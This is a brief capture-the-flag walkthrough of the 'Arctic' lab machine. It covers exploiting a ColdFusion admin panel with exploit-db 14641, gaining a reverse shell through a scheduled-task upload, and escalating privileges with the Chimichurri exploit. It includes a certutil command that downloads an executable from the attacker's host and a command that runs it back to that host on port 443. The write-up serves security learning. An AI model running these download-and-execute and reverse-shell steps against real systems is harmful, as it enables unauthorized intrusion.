I"è<p>Arctic was an easy one that i wont forget due to how certain exploits are used.</p>

<h1 id="recon">Recon</h1>
<p>Port scanning shows port 5800 is open serving coldfusion
Some directory bruteforcing returns CFIDE which will be our admin endpoint.</p>

<h1 id="pwning-the-webapp">Pwning the webapp</h1>

<p>Searching exploit-db, we find a suitable exploit that may assist in getting into the coldfusion admin panel. Exploit 14641 does some amazing things, it will retrieve the password hash of the admin/user of the panel and inject it into the html of the login form!
From this we get the password of ‚Äòhappyday‚Äô. From there, gaining a reverse shell through coldfusion is fairly stock standard. Setup a scheduled task with an upload and output file with a web directory then upload a shell. Run the task and navigate to the saved directory with a listener to gain a shell as arctic\tolis</p>

<h1 id="gaining-root">Gaining root</h1>

<p>Running ‚Äòsysteminfo‚Äô on the box shows us theres no hotfixes installed and its not a brand new os. This particular box shows signs of being vulnerable to &lt;???&gt;. Download the Chimchurri exploit from github. Use a method of file transfer on windows like the following to recieve the file.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;run webserver to host file&gt;
certutil -urlcache -split -f http://10.10.14.4/chimchurri.exe churr.exe
&lt;execute exploit when new listener is running&gt;
churr.exe 10.10.14.4 443
</code></pre></div></div>
<p>Thats it ! quick and easy root for arctic. 14641 is still one of the simplest and most effective exploits ive seen.</p>
